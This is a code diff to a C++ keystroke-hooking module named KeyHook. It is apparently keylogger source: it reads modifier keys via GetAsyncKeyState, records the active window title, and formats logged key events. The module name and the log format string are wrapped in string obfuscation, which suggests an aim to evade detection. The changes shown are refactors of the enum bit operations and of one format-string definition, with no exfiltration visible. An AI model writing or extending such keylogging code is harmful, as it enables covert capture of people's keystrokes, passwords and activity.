@@ -13,7 +13,7 @@
 
 // Obfuscated strings
 constexpr auto OBF_KEYHOOK_MODULE = OBFUSCATE("KeyHook");
-constexpr auto OBF_KEYLOG_FORMAT = OBFUSCATE("KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }");
+#define OBFUSCATED_KEYLOG_FORMAT "KeyEvent: { action: %s, key: %s, modifiers: %s, window: '%s' }"
 
 // Static member initialization
 #if PLATFORM_WINDOWS
@@ -144,13 +144,13 @@ std::string KeyHook::GetActiveWindowTitle() const {
 KeyModifiers KeyHook::GetModifierKeys() const {
     KeyModifiers modifiers = KeyModifiers::NONE;
 
-    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers |= KeyModifiers::SHIFT;
-    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers |= KeyModifiers::CONTROL;
-    if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers |= KeyModifiers::ALT;
+    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) modifiers = modifiers | KeyModifiers::SHIFT;
+    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) modifiers = modifiers | KeyModifiers::CONTROL;
+    if (GetAsyncKeyState(VK_MENU) & 0x8000) modifiers = modifiers | KeyModifiers::ALT;
     if (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000) 
-        modifiers |= KeyModifiers::WIN;
-    if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) modifiers |= KeyModifiers::CAPS_LOCK;
-    if (GetAsyncKeyState(VK_NUMLOCK) & 0x0001) modifiers |= KeyModifiers::NUM_LOCK;
+        modifiers = modifiers | KeyModifiers::WIN;
+    if (GetAsyncKeyState(VK_CAPITAL) & 0x0001) modifiers = modifiers | KeyModifiers::CAPS_LOCK;
+    if (GetAsyncKeyState(VK_NUMLOCK) & 0x0001) modifiers = modifiers | KeyModifiers::NUM_LOCK;
 
     return modifiers;
 }
@@ -215,12 +215,12 @@ void KeyHook::LogKeyEvent(const KeyData& keyData) const {
     std::string action = (keyData.eventType == KeyEventType::KEY_DOWN) ? "DOWN" : "UP";
     
     std::string modifiers;
-    if (keyData.modifiers & KeyModifiers::SHIFT) modifiers += "SHIFT+";
-    if (keyData.modifiers & KeyModifiers::CONTROL) modifiers += "CTRL+";
-    if (keyData.modifiers & KeyModifiers::ALT) modifiers += "ALT+";
-    if (keyData.modifiers & KeyModifiers::WIN) modifiers += "WIN+";
-    if (keyData.modifiers & KeyModifiers::CAPS_LOCK) modifiers += "CAPS+";
-    if (keyData.modifiers & KeyModifiers::NUM_LOCK) modifiers += "NUM+";
+    if ((keyData.modifiers & KeyModifiers::SHIFT) != KeyModifiers::NONE) modifiers += "SHIFT+";
+    if ((keyData.modifiers & KeyModifiers::CONTROL) != KeyModifiers::NONE) modifiers += "CTRL+";
+    if ((keyData.modifiers & KeyModifiers::ALT) != KeyModifiers::NONE) modifiers += "ALT+";
+    if ((keyData.modifiers & KeyModifiers::WIN) != KeyModifiers::NONE) modifiers += "WIN+";
+    if ((keyData.modifiers & KeyModifiers::CAPS_LOCK) != KeyModifiers::NONE) modifiers += "CAPS+";
+    if ((keyData.modifiers & KeyModifiers::NUM_LOCK) != KeyModifiers::NONE) modifiers += "NUM+";
     
     if (modifiers.empty()) {
         modifiers = "NONE";
